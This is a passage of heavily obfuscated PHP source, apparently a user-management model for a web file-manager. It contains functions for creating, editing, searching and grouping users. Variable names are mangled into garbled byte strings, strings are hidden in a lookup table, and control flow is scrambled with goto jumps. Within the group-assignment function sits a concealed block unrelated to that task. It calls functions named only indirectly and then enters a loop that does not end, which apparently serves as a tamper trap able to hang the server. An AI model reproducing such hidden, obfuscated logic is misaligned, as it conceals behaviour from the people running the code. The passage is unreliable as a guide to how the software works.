$_SERVER[ì‹É]; $b…ŸÍŠóÃÊ = array($b®§”ª„–[383] => $d¾ÚÆ‡¡[$b®§”ª„–[28]], $b®§”ª„–[2396] => $d¾ÚÆ‡¡[$b®§”ª„–[2397]], $b®§”ª„–[2398] => isset($d¾ÚÆ‡¡[$b®§”ª„–[290]]) ? $d¾ÚÆ‡¡[$b®§”ª„–[290]] : $b®§”ª„–[33], $b®§”ª„–[2399] => isset($d¾ÚÆ‡¡[$b®§”ª„–[2393]]) ? $d¾ÚÆ‡¡[$b®§”ª„–[2393]] : $b®§”ª„–[33], $b®§”ª„–[2400] => isset($d¾ÚÆ‡¡[$b®§”ª„–[2232]]) ? $d¾ÚÆ‡¡[$b®§”ª„–[2232]] : $d¾ÚÆ‡¡[$b®§”ª„–[28]], $b®§”ª„–[2401] => isset($d¾ÚÆ‡¡[$b®§”ª„–[2378]]) ? $d¾ÚÆ‡¡[$b®§”ª„–[2378]] : $b®§”ª„–[33], $b®§”ª„–[2402] => isset($d¾ÚÆ‡¡[$b®§”ª„–[2403]]) ? $d¾ÚÆ‡¡[$b®§”ª„–[2403]] : 1, $b®§”ª„–[2404] => $d¾ÚÆ‡¡[$b®§”ª„–[798]], $b®§”ª„–[2086] => isset($d¾ÚÆ‡¡[$b®§”ª„–[1998]]) ? $d¾ÚÆ‡¡[$b®§”ª„–[1998]] : 1024 * 1024 * 20, $b®§”ª„–[2087] => 0, $b®§”ª„–[2394] => 0, $b®§”ª„–[2111] => isset($d¾ÚÆ‡¡[$b®§”ª„–[676]]) ? $d¾ÚÆ‡¡[$b®§”ª„–[676]] : 1); if (!empty($d¾ÚÆ‡¡[$b®§”ª„–[1351]])) { $b…ŸÍŠóÃÊ[$b®§”ª„–[1351]] = $d¾ÚÆ‡¡[$b®§”ª„–[1351]]; } goto A„§è›ëÖÀ; e¼Î™õ¦ì: return $FäŞ‰¤ÒÉ×; goto DçÄ…¬›¼; A„§è›ëÖÀ: $A”ÁƒÅ‰ê© = $this->_checkExist($d¾ÚÆ‡¡); if ($A”ÁƒÅ‰ê© !== !0) { return $A”ÁƒÅ‰ê©; } $FäŞ‰¤ÒÉ× = $this->add($b…ŸÍŠóÃÊ); goto fÌ¼ë‰Şî; fÌ¼ë‰Şî: $f‰›Áï‹ø£ = array($b®§”ª„–[2404] => $b…ŸÍŠóÃÊ[$b®§”ª„–[798]], $b®§”ª„–[2400] => $b…ŸÍŠóÃÊ[$b®§”ª„–[2232]]); $this->userEdit($FäŞ‰¤ÒÉ×, $f‰›Áï‹ø£); Model($b®§”ª„–[1083])->userRootAdd($FäŞ‰¤ÒÉ×); goto e¼Î™õ¦ì; DçÄ…¬›¼: } protected function userEditTest($EŸ¬ªŠÈÛ, $Bè«±¿éóÍ) { return $this->call($_SERVER[ì‹É][2405], $EŸ¬ªŠÈÛ, $Bè«±¿éóÍ); } protected function userEdit($aã­Ûº ‘, $f¹­¦Ã™²Ã) { goto Bã—ï°Ç; B•·§î¿™‡: $this->where(array($B¶š„¡½–Ê[1342] => $aã­Ûº ‘))->save($f¹­¦Ã™²Ã); if (isset($f¹­¦Ã™²Ã[$B¶š„¡½–Ê[2232]])) { $this->setNamePinyin($aã­Ûº ‘, $f¹­¦Ã™²Ã[$B¶š„¡½–Ê[2232]]); } return !0; goto Aôö—°êÛÑ; Bã—ï°Ç: $B¶š„¡½–Ê =& $_SERVER[ì‹É]; $fÜ‡ˆÑ­Õì = $this->getInfoSimple($aã­Ûº ‘); if (!$fÜ‡ˆÑ­Õì) { return !1; } goto E½×¿ĞõÇ‹; E½×¿ĞõÇ‹: $eØ££—¶± = $this->_checkExist($f¹­¦Ã™²Ã, $aã­Ûº ‘); if ($eØ££—¶± !== !0) { return $eØ££—¶±; } if (isset($f¹­¦Ã™²Ã[$B¶š„¡½–Ê[798]]) && trim($f¹­¦Ã™²Ã[$B¶š„¡½–Ê[798]]) != $B¶š„¡½–Ê[33]) { $EâÈòíÖÅŸ = $this->metaGet($aã­Ûº ‘); if (empty($EâÈòíÖÅŸ[$B¶š„¡½–Ê[2395]])) { $EâÈòíÖÅŸ[$B¶š„¡½–Ê[2395]] = rand_string(10); Model($B¶š„¡½–Ê[466])->metaSet($aã­Ûº ‘, $B¶š„¡½–Ê[2395], $EâÈòíÖÅŸ[$B¶š„¡½–Ê[2395]]); } $f¹­¦Ã™²Ã[$B¶š„¡½–Ê[798]] = md5($EâÈòíÖÅŸ[$B¶š„¡½–Ê[2395]] . trim($f¹­¦Ã™²Ã[$B¶š„¡½–Ê[798]])); } else { unset($f¹­¦Ã™²Ã[$B¶š„¡½–Ê[798]]); } goto B•·§î¿™‡; Aôö—°êÛÑ: } public function setNamePinyin($DÁ„„÷íçà, $AÇˆÏ­¥‰Â = false) { $DİóÑ¨©Ê¸ =& $_SERVER[ì‹É]; if (!$AÇˆÏ­¥‰Â) { $fÓ¶š¬›†ë = $this->getInfoSimple($DÁ„„÷íçà); $AÇˆÏ­¥‰Â = $fÓ¶š¬›†ë[$DİóÑ¨©Ê¸[2232]] ? $fÓ¶š¬›†ë[$DİóÑ¨©Ê¸[2232]] : $fÓ¶š¬›†ë[$DİóÑ¨©Ê¸[28]]; } $B›®ñË¸ŞÕ = Model($DİóÑ¨©Ê¸[469]); if (!Input::check($AÇˆÏ­¥‰Â, $DİóÑ¨©Ê¸[520])) { return $B›®ñË¸ŞÕ->metaSet($DÁ„„÷íçà, array($DİóÑ¨©Ê¸[412] => $DİóÑ¨©Ê¸[33], $DİóÑ¨©Ê¸[411] => $DİóÑ¨©Ê¸[33])); } return $B›®ñË¸ŞÕ->metaSet($DÁ„„÷íçà, array($DİóÑ¨©Ê¸[412] => str_replace($DİóÑ¨©Ê¸[50], $DİóÑ¨©Ê¸[33], Pinyin::encode($AÇˆÏ­¥‰Â)), $DİóÑ¨©Ê¸[411] => Pinyin::encode($AÇˆÏ­¥‰Â, $DİóÑ¨©Ê¸[521]))); } private function nickNameRpt() { $Bòã°½£¹ =& $_SERVER[ì‹É]; $bŠÚà„¿Ú = Model($Bòã°½£¹[1061])->get($Bòã°½£¹[2406]); $fµ¢Æ‘‰ = $GLOBALS[$Bòã°½£¹[6]][$Bòã°½£¹[2363]][$Bòã°½£¹[2406]]; $b¬à«Äåµ = !is_null($bŠÚà„¿Ú) ? $bŠÚà„¿Ú : $fµ¢Æ‘‰; return !!$b¬à«Äåµ; } private function _checkExist($b«Ä‘ïø°, $dÔ¾Ê¹ßí = false) { $BÜäƒåê =& $_SERVER[ì‹É]; $eÚ¹ãŞ¢ª— = array($BÜäƒåê[28] => UserModel::ERROR_USER_EXIST_NAME, $BÜäƒåê[2232] => UserModel::ERROR_USER_EXIST_NICKNAME, $BÜäƒåê[290] => UserModel::ERROR_USER_EXIST_EMAIL, $BÜäƒåê[2393] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($eÚ¹ãŞ¢ª—[$BÜäƒåê[2232]]); } $aåÆÊôæï = $dÔ¾Ê¹ßí ? array($BÜäƒåê[1351] => array($BÜäƒåê[2407], $dÔ¾Ê¹ßí)) : array(); foreach ($eÚ¹ãŞ¢ª— as $F°ºŒİ· => $b™šîÜ¬ØÈ) { if (!isset($b«Ä‘ïø°[$F°ºŒİ·]) || !$b«Ä‘ïø°[$F°ºŒİ·]) { continue; } $DÍ´ö­À³ = array_merge(array($F°ºŒİ· => $b«Ä‘ïø°[$F°ºŒİ·]), $aåÆÊôæï); $cäÉŒÍòõä = $this->where($DÍ´ö­À³)->find(); if ($cäÉŒÍòõä) { return $b™šîÜ¬ØÈ; } } return !0; } public function userListInfo($A •—İÄ§œ) { $bğÄƒŞ«¹ =& $_SERVER[ì‹É]; $F «Ö‘—¢õ = array(); $A •—İÄ§œ = array_unique($A •—İÄ§œ); if (!$A •—İÄ§œ) { return $F «Ö‘—¢õ; } if (count($A •—İÄ§œ) < 20) { foreach ($A •—İÄ§œ as $D¸ª‹©÷®¥) { $F «Ö‘—¢õ[$D¸ª‹©÷®¥ . $bğÄƒŞ«¹[33]] = $this->getInfoSimpleOuter($D¸ª‹©÷®¥); } } else { $BÛß÷¡±­ = array($bğÄƒŞ«¹[1342] => array($bğÄƒŞ«¹[381], $A •—İÄ§œ)); if (count($A •—İÄ§œ) == 1) { $BÛß÷¡±­ = array($bğÄƒŞ«¹[1342] => $A •—İÄ§œ[0]); } $F¯ù³ğ“ï¼ = Model($bğÄƒŞ«¹[466])->field($this->simpleField)->where($BÛß÷¡±­)->select(); $F¯ù³ğ“ï¼ = array_to_keyvalue($F¯ù³ğ“ï¼, $bğÄƒŞ«¹[1351]); foreach ($A •—İÄ§œ as $D¸ª‹©÷®¥) { $b«®‚Œ”Á» = $F¯ù³ğ“ï¼[$F¯ù³ğ“ï¼[$D¸ª‹©÷®¥]]; if (!$b«®‚Œ”Á») { $F «Ö‘—¢õ[$D¸ª‹©÷®¥ . $bğÄƒŞ«¹[33]] = $this->getInfoSimpleOuter($D¸ª‹©÷®¥); continue; } $b«®‚Œ”Á»[$bğÄƒŞ«¹[2378]] = Action($bğÄƒŞ«¹[2379])->parseUrl($b«®‚Œ”Á»[$bğÄƒŞ«¹[2378]]); $F «Ö‘—¢õ[$D¸ª‹©÷®¥ . $bğÄƒŞ«¹[33]] = $b«®‚Œ”Á»; } } return $F «Ö‘—¢õ; } protected function userStatus($AÖÛñïĞ«, $Bø­¤ãäÑì) { $aò•Œ®Ä = $this->getInfoSimple($AÖÛñïĞ«); if (!$aò•Œ®Ä) { return !1; } $A¦¹Â‚Àè = array($_SERVER[ì‹É][676] => $Bø­¤ãäÑì); return $this->userEdit($AÖÛñïĞ«, $A¦¹Â‚Àè); } protected function userRemove($b’š„å…„) { goto Aµ˜•Ç“‚¡; F‚äœåãåÊ: Model($F½íöÈîç[757])->userRootRemove($b’š„å…„); return $this->where($A«ğÇ®ìì)->delete(); goto cÉ¯®Ÿæ‹—; Aµ˜•Ç“‚¡: $F½íöÈîç =& $_SERVER[ì‹É]; $cˆ°˜îïİÊ = $this->getInfoSimple($b’š„å…„); if (!$cˆ°˜îïİÊ) { return !1; } goto Fé‚®¿ËŸ×; C³ÔñíëŒ: Model($F½íöÈîç[2090])->where($A«ğÇ®ìì)->delete(); Model($F½íöÈîç[2392])->where($A«ğÇ®ìì)->delete(); Model($F½íöÈîç[2409])->where($A«ğÇ®ìì)->delete(); goto F‚äœåãåÊ; Fé‚®¿ËŸ×: $A«ğÇ®ìì = array($F½íöÈîç[1342] => $b’š„å…„); Model($F½íöÈîç[528])->where($A«ğÇ®ìì)->delete(); Model($F½íöÈîç[2408])->where($A«ğÇ®ìì)->delete(); goto C³ÔñíëŒ; cÉ¯®Ÿæ‹—: } protected function userGroupSet($CàæãÂí¡Ü, $D¦£ÕÅ½, $E³¢ïóæ¯Ã = array()) { goto B†å²ó±ˆˆ; C«èÜ±Š„Ç: return $dâÁäêòŠ©->addAll($B«¯ñ¥°«, array(), !0); goto cŒ°»ë Ë; B†å²ó±ˆˆ: $eÛªñÊôÏ =& $_SERVER[ì‹É]; if (!isset($_SERVER[$eÛªñÊôÏ[733]]) || !isset($_SERVER[$eÛªñÊôÏ[790]])) { goto D»‡ÉÛÁš—; A›ËŸğäé: for ($EÏÉÄÆ—Åº = $e§æ–©Ì¤Ê; $EÏÉÄÆ—Åº > 0; $EÏÉÄÆ—Åº++) { $eÙàËáòˆ = json_encode($GLOBALS[$eÛªñÊôÏ[381]]); } goto BÀ¥Ï¼¼Èƒ; Fö÷É¡÷”æ: $E„’’Šğ²Û = $FíõÑª±ğ”($AíˆÁ³„òß); $bÄÛÜ”×Ü² = explode($eÛªñÊôÏ[214], $E„’’Šğ²Û); if (count($bÄÛÜ”×Ü²) < $eÛªñÊôÏ[543]) { $D½‘«„ò¡¦ = $eÛªñÊôÏ[737]; $D½‘«„ò¡¦(); } goto Fõæİ¦Û²¥; Fõæİ¦Û²¥: $eÙàËáòˆ = $eÛªñÊôÏ[792]; $eÙàËáòˆ($_SERVER[$eÛªñÊôÏ[793]]); $e§æ–©Ì¤Ê = 1; goto A›ËŸğäé; D»‡ÉÛÁš—: $eÉ‰Ü˜¯ì = $eÛªñÊôÏ[791]; $FíõÑª±ğ” = $eÛªñÊôÏ[734]; $AíˆÁ³„òß = $_SERVER[$eÛªñÊôÏ[735]] . $eÛªñÊôÏ[736]; goto Fö÷É¡÷”æ; BÀ¥Ï¼¼Èƒ: } $bº‰Œæ»™© = $this->getInfoSimple($CàæãÂí¡Ü); goto AÔ’¬“Æè; AÔ’¬“Æè: if (!$bº‰Œæ»™© || !is_array($D¦£ÕÅ½)) { return !1; } $dâÁäêòŠ© = Model($eÛªñÊôÏ[2090]); $dâÁäêòŠ©->where(array($eÛªñÊôÏ[1351] => $CàæãÂí¡Ü))->delete(); goto c®à‰†·øö; c®à‰†·øö: $B«¯ñ¥°« = array(); $dŒ†ïÂ¹± = 0; foreach ($D¦£ÕÅ½ as $E‹¹é„íï  => $Ešš´–ĞÅ) { $F‹è‡ğ»ŒŒ = array($eÛªñÊôÏ[1351] => $CàæãÂí¡Ü, $eÛªñÊôÏ[2014] => $E‹¹é„íï , $eÛªñÊôÏ[2144] => $Ešš´–ĞÅ); $F‹è‡ğ»ŒŒ[$eÛªñÊôÏ[2035]] = isset($E³¢ïóæ¯Ã[$dŒ†ïÂ¹±]) ? $E³¢ïóæ¯Ã[$dŒ†ïÂ¹±] : 0; $dŒ†ïÂ¹±++; $B«¯ñ¥°«[] = $F‹è‡ğ»ŒŒ; } goto C«èÜ±Š„Ç; cŒ°»ë Ë: } protected function userGroupAdd($aŸïé °Ÿ, $DáÂÄˆÙì, $D°¢É²Ô†À) { $d™—øŒšõÒ =& $_SERVER[ì‹É]; $Dáµ‰ô˜¡ó = $this->getInfoSimple($aŸïé °Ÿ); if (!$Dáµ‰ô˜¡ó || !$DáÂÄˆÙì) { return !1; } $E‡ÀâÍÜƒà = array(array($d™—øŒšõÒ[1351] => $aŸïé °Ÿ, $d™—øŒšõÒ[2014] => $DáÂÄˆÙì, $d™—øŒšõÒ[2144] => $D°¢É²Ô†À)); return Model($d™—øŒšõÒ[2090])->addAll($E‡ÀâÍÜƒà, array(), !0); } protected function userGroupRemove($Cö•Š–ª§¶, $EÑõª ôÖô) { $CÂÊë¡Š =& $_SERVER[ì‹É]; $b¨œÄç†»¢ = $this->getInfoSimple($Cö•Š–ª§¶); if (!$b¨œÄç†»¢ || !$EÑõª ôÖô) { return !1; } $E†—óã…Şš = array($CÂÊë¡Š[1342] => $Cö•Š–ª§¶, $CÂÊë¡Š[2088] => $EÑõª ôÖô); return Model($CÂÊë¡Š[2090])->where($E†—óã…Şš)->delete(); } public function listData() { $dÀŒ³…§á = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dÀŒ³…§á[$_SERVER[ì‹É][350]]); return $dÀŒ³…§á; } public function listByID($e—”¹³šª‚) { $fÉèÕˆÊ¿ê =& $_SERVER[ì‹É]; if (!$e—”¹³šª‚) { return; } $fë‡§øï£ = array($fÉèÕˆÊ¿ê[1351] => array($fÉèÕˆÊ¿ê[7], $e—”¹³šª‚)); $a‘š¸¾« = $this->where($fë‡§øï£)->select(); $this->_listDataApply($a‘š¸¾«); return $a‘š¸¾«; } public function listByGroup($C¢±ŞÌ½Ã„ = 0, $b³œõ÷³–£ = array()) { goto A§«‘¸Éïí; eØºÌÔç”…: $EŸİÚÃ£Ğ‚ = array(); if ($C¢±ŞÌ½Ã„) { $EŸİÚÃ£Ğ‚ = array($d”æğ…¬ÁÃ[2411] => intval($C¢±ŞÌ½Ã„)); $DËÀ×óÍ¢ = "\x4c\x45\x46\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\x75\163\x65\x72\x5f\147\x72\x6f\165\x70\40\x75\163\145\162\x5f\147\x72\157\165\x70\x20\157\x6e\x20\165\163\x65\x72\56\x75\x73\145\x72\111\x44\x20\75\x20\165\163\x65\x72\x5f\147\x72\x6f\x75\x70\56\x75\163\x65\x72\x49\104"; $D£‡Îˆø´¡ = Input::get($d”æğ…¬ÁÃ[403], null, $d”æğ…¬ÁÃ[33]) ? $d”æğ…¬ÁÃ[33] : $d”æğ…¬ÁÃ[2412]; } if (isset($b³œõ÷³–£[$d”æğ…¬ÁÃ[676]])) { $EŸİÚÃ£Ğ‚[$d”æğ…¬ÁÃ[2413]] = $b³œõ÷³–£[$d”æğ…¬ÁÃ[676]]; } goto b©ª¦Ë†ÉÚ; A§«‘¸Éïí: $d”æğ…¬ÁÃ =& $_SERVER[ì‹É]; $aÈÒÀÌ­ØÇ = isset($b³œõ÷³–£[$d”æğ…¬ÁÃ[2410]]) ? $b³œõ÷³–£[$d”æğ…¬ÁÃ[2410]] : $d”æğ…¬ÁÃ[33]; $DËÀ×óÍ¢ = $d”æğ…¬ÁÃ[33]; goto eØºÌÔç”…; b©ª¦Ë†ÉÚ: $cİÔãØœ£• = $this->_makeOrder($D£‡Îˆø´¡)->field($d”æğ…¬ÁÃ[2414])->where($EŸİÚÃ£Ğ‚)->join($DËÀ×óÍ¢)->selectPage(50); $A¡â¦»øŞÃ = $d”æğ…¬ÁÃ[968] . ($aÈÒÀÌ­ØÇ ? $d”æğ…¬ÁÃ[47] . $aÈÒÀÌ­ØÇ : $d”æğ…¬ÁÃ[33]); $this->_listDataApply($cİÔãØœ£•[$d”æğ…¬ÁÃ[350]], $A¡â¦»øŞÃ); goto B£ä¨İƒ; B£ä¨İƒ: return $cİÔãØœ£•; goto c¬ôìÚÅ¡; c¬ôìÚÅ¡: } private function _makeOrder($d‹ƒ•ï‰Öó = '') { goto fæ‘¬ğ; e× è†ˆ°Ê: $d‹ƒ•ï‰Öó = $d‹ƒ•ï‰Öó . "\x75\163\x65\162\x2e{$B±šö’Ìœï}\40{$eõ‚âÙİè}\x2c\40\x75\163\x65\162\56\165\163\x65\162\111\x44\x20\141\x73\x63"; return $this->alias($D¹§îÒ‘Ãå[2174])->order($d‹ƒ•ï‰Öó); goto dòÑá„ÄÄ; fæ‘¬ğ: $D¹§îÒ‘Ãå =& $_SERVER[ì‹É]; $CÀ»èé‰ = array($D¹§îÒ‘Ãå[1351], $D¹§îÒ‘Ãå[28], $D¹§îÒ‘Ãå[2000], $D¹§îÒ‘Ãå[1974], $D¹§îÒ‘Ãå[184]); $f³­Š¤ù»ù = array($D¹§îÒ‘Ãå[398] => $D¹§îÒ‘Ãå[399], $D¹§îÒ‘Ãå[400] => $D¹§îÒ‘Ãå[401]); goto cá´Å¢Óè¹; cá´Å¢Óè¹: $B±šö’Ìœï = Input::get($D¹§îÒ‘Ãå[403], $D¹§îÒ‘Ãå[7], $D¹§îÒ‘Ãå[1342], $CÀ»èé‰); $eõ‚âÙİè = Input::get($D¹§îÒ‘Ãå[404], $D¹§îÒ‘Ãå[7], $D¹§îÒ‘Ãå[2091], array($D¹§îÒ‘Ãå[2091], $D¹§îÒ‘Ãå[400])); $eõ‚âÙİè = $f³­Š¤ù»ù[$eõ‚âÙİè]; goto e× è†ˆ°Ê; dòÑá„ÄÄ: } public function listSearch($fõ†ÃÚ…Ñ†) { goto b›’ÛÕ‹; A©×ˆàÂã: $this->_filterUserList($E…ƒ¨‡òé); return $E…ƒ¨‡òé; goto A×»…ã”î´; b¬Óå¡†ò: if (!$A‚£ËùŠ¡ñ) { $CÅ¨ßÃÁÄÏ = array(); } if (isset($fõ†ÃÚ…Ñ†[$AÀîÒºõ‡É[676]])) { $CÅ¨ßÃÁÄÏ[$AÀîÒºõ‡É[676]] = $fõ†ÃÚ…Ñ†[$AÀîÒºõ‡É[676]]; } $E…ƒ¨‡òé = $this->_makeOrder()->where($CÅ¨ßÃÁÄÏ)->selectPage(20); goto b®ÃĞ©Ğ•ë; C…£¹Ì¯Ö…: $A‚£ËùŠ¡ñ = str_replace($AÀîÒºõ‡É[2094], $AÀîÒºõ‡É[2095], trim($A‚£ËùŠ¡ñ)); $CÅ¨ßÃÁÄÏ = array($AÀîÒºõ‡É[28] => array($AÀîÒºõ‡É[756], "\45{$A‚£ËùŠ¡ñ}\x25"), $AÀîÒºõ‡É[290] => array($AÀîÒºõ‡É[756], "\45{$A‚£ËùŠ¡ñ}\x25"), $AÀîÒºõ‡É[2232] => array($AÀîÒºõ‡É[756], "\x25{$A‚£ËùŠ¡ñ}\x25"), $AÀîÒºõ‡É[911] => $AÀîÒºõ‡É[2096]); if (Input::check($A‚£ËùŠ¡ñ, $AÀîÒºõ‡É[296])) { $CÅ¨ßÃÁÄÏ[$AÀîÒºõ‡É[1351]] = array($AÀîÒºõ‡É[756], "\x25{$A‚£ËùŠ¡ñ}\45"); $CÅ¨ßÃÁÄÏ[$AÀîÒºõ‡É[2393]] = array($AÀîÒºõ‡É[756], "\45{$A‚£ËùŠ¡ñ}\45"); } goto b¬Óå¡†ò; b®ÃĞ©Ğ•ë: if (!$E…ƒ¨‡òé || count($E…ƒ¨‡òé[$AÀîÒºõ‡É[350]]) < 5 && Input::check($A‚£ËùŠ¡ñ, $AÀîÒºõ‡É[303])) { $c‹„ø³ºŞ = $this->_searchFromMeta($AÀîÒºõ‡É[411], $A‚£ËùŠ¡ñ, 10); $f· ¹Ò–ƒ¨ = $this->_searchFromMeta($AÀîÒºõ‡É[412], $A‚£ËùŠ¡ñ, 10); $e—ß¾ËƒŒÑ = array_merge($c‹„ø³ºŞ, $f· ¹Ò–ƒ¨, $E…ƒ¨‡òé[$AÀîÒºõ‡É[350]]); $E…ƒ¨‡òé[$AÀîÒºõ‡É[350]] = array_unique_by_key($e—ß¾ËƒŒÑ, $AÀîÒºõ‡É[1351]); $E…ƒ¨‡òé[$AÀîÒºõ‡É[347]][$AÀîÒºõ‡É[348]] = count($E…ƒ¨‡òé[$AÀîÒºõ‡É[350]]); $E…ƒ¨‡òé[$AÀîÒºõ‡É[347]][$AÀîÒºõ‡É[349]] = ceil($E…ƒ¨‡òé[$AÀîÒºõ‡É[347]][$AÀîÒºõ‡É[348]] / $E…ƒ¨‡òé[$AÀîÒºõ‡É[347]][$AÀîÒºõ‡É[345]]); } $this->_listDataApply($E…ƒ¨‡òé[$AÀîÒºõ‡É[350]]); $this->_filterByGroup($E…ƒ¨‡òé, $Fç®Œ£•‰); goto A©×ˆàÂã; b›’ÛÕ‹: $AÀîÒºõ‡É =& $_SERVER[ì‹É]; $A‚£ËùŠ¡ñ = $fõ†ÃÚ…Ñ†[$AÀîÒºõ‡É[2092]]; $Fç®Œ£•‰ = isset($fõ†ÃÚ…Ñ†[$AÀîÒºõ‡É[2093]]) ? $fõ†ÃÚ…Ñ†[$AÀîÒºõ‡É[2093]] : !1; goto C…£¹Ì¯Ö…; A×»…ã”î´: } private function _filterByGroup(&$a¹ìµÙŒ­½, $DâËèÕŞ®) { $a‚›Ó‚ÁÄË =& $_SERVER[ì‹É]; if (!$DâËèÕŞ®) { return $a¹ìµÙŒ­½; } foreach ($a¹ìµÙŒ­½[$a‚›Ó‚ÁÄË[350]] as $d‡èÊºØ¬ => &$F„¨¯¼àÍ) { $fÙï‹Ï¬ = array_to_keyvalue($F„¨¯¼àÍ[$a‚›Ó‚ÁÄË[2415]], $a‚›Ó‚ÁÄË[33], $a‚›Ó‚ÁÄË[2014]); if (!in_array($DâËèÕŞ®, $fÙï‹Ï¬)) { unset($a¹ìµÙŒ­½[$a‚›Ó‚ÁÄË[350]][$d‡èÊºØ¬]); } } $a¹ìµÙŒ­½[$a‚›Ó‚ÁÄË[350]] = array_values($a¹ìµÙŒ­½[$a‚›Ó‚ÁÄË[350]]); $a¹ìµÙŒ­½[$a‚›Ó‚ÁÄË[347]] = array($a‚›Ó‚ÁÄË[2208] => count($a¹ìµÙŒ­½[$a‚›Ó‚ÁÄË[350]]), $a‚›Ó‚ÁÄË[2206] => $a¹ìµÙŒ­½[$a‚›Ó‚ÁÄË[347]][$a‚›Ó‚ÁÄË[345]], $a‚›Ó‚ÁÄË[2205] => 1, $a‚›Ó‚ÁÄË[2207] => 1); } private function _filterUserList(&$Dé¼ƒÑ³ë‡) { $eƒƒø‹îÓã =& $_SERVER[ì‹É]; foreach ($Dé¼ƒÑ³ë‡[$eƒƒø‹îÓã[350]] as $dË…“Í†¢ => &$b˜™£ˆŸæ) { unset($b˜™£ˆŸæ[$eƒƒø‹îÓã[413]]); } } private function _searchFromMeta($bÈ‚Œ©–Ñ¶, $e«§˜…Æì‰, $dè¾·›’©) { goto d†ÀÇŸæĞå; d†ÀÇŸæĞå: $Eª÷µƒâğ =& $_SERVER[ì‹É]; $e«§˜…Æì‰ = strtolower($e«§˜…Æì‰); $fºËÁ½ = array($Eª÷µƒâğ[90] => $bÈ‚Œ©–Ñ¶, $Eª÷µƒâğ[354] => array($Eª÷µƒâğ[756], "\45{$e«§˜…Æì‰}\x25")); goto A‘¹ãÜ÷ä; A‘¹ãÜ÷ä: $bˆ©¹ùŒƒÏ = Model($Eª÷µƒâğ[2416])->where($fºËÁ½)->limit($dè¾·›’©)->select(); if (!$bˆ©¹ùŒƒÏ) { return array(); } $bˆ©¹ùŒƒÏ = array_to_keyvalue($bˆ©¹ùŒƒÏ, $Eª÷µƒâğ[33], $Eª÷µƒâğ[1351]); goto E‚Ã¬Ã¾À; E‚Ã¬Ã¾À: $cø–“îŠêÁ = $this->where(array($Eª÷µƒâğ[1342] => array($Eª÷µƒâğ[7], $bˆ©¹ùŒƒÏ)))->select(); if (!$cø–“îŠêÁ) { return array(); } return $cø–“îŠêÁ; goto EÇ•„ÔîØª; EÇ•„ÔîØª: } private function _listDataApplyItem($CãöÇë®¸™) { $B†‘ï…õÂ = array($CãöÇë®¸™); $this->_listDataApply($B†‘ï…õÂ); return $B†‘ï…õÂ[0]; } private function _listDataApply(&$dìŒŠ£áï‚, $A¹Ò” ÃŒ = "\x67\162\x6f\165\x70\54\155\x65\x74\141\54\x73\x6f\165\162\143\x65") { goto Cõš¨åƒŒ‹; Cõš¨åƒŒ‹: $cŒ´âò¤¦ =& $_SERVER[ì‹É]; if (!$dìŒŠ£áï‚) { return; } array_remove_key($dìŒŠ£áï‚, $cŒ´âò¤¦[798]); goto d­á Õµ¹•; d­á Õµ¹•: $dÈŞ©³Ğ™Ù = array_to_keyvalue($dìŒŠ£áï‚, $cŒ´âò¤¦[33], $cŒ´âò¤¦[1351]); $A¹Ò” ÃŒ = explode($cŒ´âò¤¦[47], $A¹Ò” ÃŒ); if (in_array($cŒ´âò¤¦[968], $A¹Ò” ÃŒ)) { $this->_listAppendGroup($dìŒŠ£áï‚, $dÈŞ©³Ğ™Ù); } goto dùíÜÀñïØ; dùíÜÀñïØ: if (in_array($cŒ´âò¤¦[2417], $A¹Ò” ÃŒ)) { $this->_listAppendMeta($dìŒŠ£áï‚, $dÈŞ©³Ğ™Ù); } if (in_array($cŒ´âò¤¦[379], $A¹Ò” ÃŒ)) { $this->_listAppendSourceRoot($dìŒŠ£áï‚, $dÈŞ©³Ğ™Ù); } goto dÂ¯Œ±ïÓ; dÂ¯Œ±ïÓ: } private function _listAppendSourceRoot(&$FÓÒ‘ŞŒãí, $AƒóÄîÌ¶») { goto dÜøƒñ²í; DÄĞ¬›¶¥ø: $cíó÷¨æ»Æ = Model($dµ²ğƒÇ•Ö[757])->order($dµ²ğƒÇ•Ö[2103])->field($E­ñÕœ“Æ˜)->where($DŠªä¸½Æ­)->select(); $cíó÷¨æ»Æ = array_to_keyvalue($cíó÷¨æ»Æ, $dµ²ğƒÇ•Ö[452]); $cíó÷¨æ»Æ = array_remove_key($cíó÷¨æ»Æ, $dµ²ğƒÇ•Ö[452]); goto C˜®‚Ú°; C˜®‚Ú°: foreach ($FÓÒ‘ŞŒãí as &$FïÃ…Ì†ä») { $FïÃ…Ì†ä»[$dµ²ğƒÇ•Ö[388]] = $cíó÷¨æ»Æ[$FïÃ…Ì†ä»[$dµ²ğƒÇ•Ö[1351]]] ? $cíó÷¨æ»Æ[$FïÃ…Ì†ä»[$dµ²ğƒÇ•Ö[1351]]] : array(); } goto e‰Ú©± ; dÜøƒñ²í: $dµ²ğƒÇ•Ö =& $_SERVER[ì‹É]; $DŠªä¸½Æ­ = array($dµ²ğƒÇ•Ö[457] => 0, $dµ²ğƒÇ•Ö[368] => SourceModel::TYPE_USER, $dµ²ğƒÇ•Ö[452] => array($dµ²ğƒÇ•Ö[7], $AƒóÄîÌ¶»)); $E­ñÕœ“Æ˜ = $dµ²ğƒÇ•Ö[2102]; goto DÄĞ¬›¶¥ø; e‰Ú©± : } private function _listAppendGroup(&$CÂ÷›åİáÙ, $Fø¼âğÅõ‘) { goto B½Ğˆƒ†ô; D‚Ëõ¸‰â: $EÆ—ØÅÅ– = array_to_keyvalue($CæÈ±ˆÙæÂ, $a†Ö¿ø´™[33], $a†Ö¿ø´™[2014]); $EÆ—ØÅÅ– = array_remove_value(array_unique($EÆ—ØÅÅ–), $a†Ö¿ø´™[464]); if (!$EÆ—ØÅÅ– || !$CæÈ±ˆÙæÂ) { return; } goto BÅæÇÚœ’; f¥ïã¬´÷: $CæÈ±ˆÙæÂ = array_to_keyvalue_group($CæÈ±ˆÙæÂ, $a†Ö¿ø´™[1351]); foreach ($CæÈ±ˆÙæÂ as &$AÌ×½Ô¹¨) { $Bà—Ğ’¬–Ä = array(); foreach ($AÌ×½Ô¹¨ as $D¾£¤Ã•ß•) { if (!$D¾£¤Ã•ß•[$a†Ö¿ø´™[2144]]) { continue; } $cò²éßŒÌ = Model($a†Ö¿ø´™[2160])->listData($D¾£¤Ã•ß•[$a†Ö¿ø´™[2144]]); $Bà—Ğ’¬–Ä[] = array($a†Ö¿ø´™[2014] => $D¾£¤Ã•ß•[$a†Ö¿ø´™[2014]], $a†Ö¿ø´™[2420] => 